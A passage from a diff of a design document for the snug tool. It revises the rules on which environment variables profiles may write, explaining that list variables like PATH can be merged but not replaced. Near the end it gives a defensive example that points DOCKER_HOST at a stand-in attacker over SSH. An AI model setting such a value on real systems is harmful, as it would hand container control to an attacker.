@@ -21,10 +21,10 @@ owns the variable types; snug never splits a string on a separator.
 | `environ.inherit` | profile | any | copy host value verbatim |
 | `environ.sanitise` | profile | **lists** | copy host value, keep only elements policy grants |
 
-**And a sixth thing that is not a verb: snug's own authorship.** **No profile may
-write a name snug writes, and snug is not bound by the verbs' rules when writing
-them.** The list is nineteen keys, and it must be **derived from the code rather
-than retyped**, because an earlier draft retyped it and missed six:
+**And a sixth thing that is not a verb: snug's own authorship.** **snug is not
+bound by the verbs' rules when writing its own variables.** The list is twenty
+keys, and it must be **derived from the code rather than retyped** — an earlier
+draft retyped it, gave the count as nineteen, and missed six:
 
 ```
 resolve.go   HOME SHELL USER LOGNAME TMPDIR PS1 PATH TERM TZ LANG
@@ -32,6 +32,24 @@ resolve.go   HOME SHELL USER LOGNAME TMPDIR PS1 PATH TERM TZ LANG
 identity.go  SSH_AUTH_SOCK GH_CONFIG_DIR GH_HOST          ← written AFTER Resolve
 container.go CONTAINER_HOST DOCKER_HOST DOCKER_BUILDKIT   ← written AFTER Resolve
 ```
+
+**Ownership refuses the verbs that REPLACE a value, not every verb.** An earlier
+draft said flatly "no profile may write a name snug writes" and listed `PATH` —
+which contradicts §1.2's `@rust`, §2.4's band diagram and §2.8's rendering, all
+of which require `environ.merge PATH` to be legal. The reading under which every
+one of those is true:
+
+- **For a scalar, that is every verb a profile has.** `HOME`, `SHELL`, `PS1`,
+  `SNUG*` and the rest are refused outright, because writing them means replacing
+  them.
+- **For a list, snug's authorship is a *band* (§2.4), so contributing is not
+  replacing.** `merge`, `prepend` and `sanitise` add a band ahead of snug's base
+  and displace nothing; `set` and `inherit` are refused by the *type* rules,
+  which already say a list takes neither.
+
+What stays unconditional is **the base `PATH`**, not the variable. `PATH` is the
+only list among the twenty owned names — verified — so the exemption is exactly
+one variable wide, and `TestPATHIsSharedButNotReplaceable` pins both halves.
 
 The six post-`Resolve` writers are the dangerous half. A hand-maintained list
 that omits them makes `environ.set DOCKER_HOST = "ssh://attacker/..."` legal on
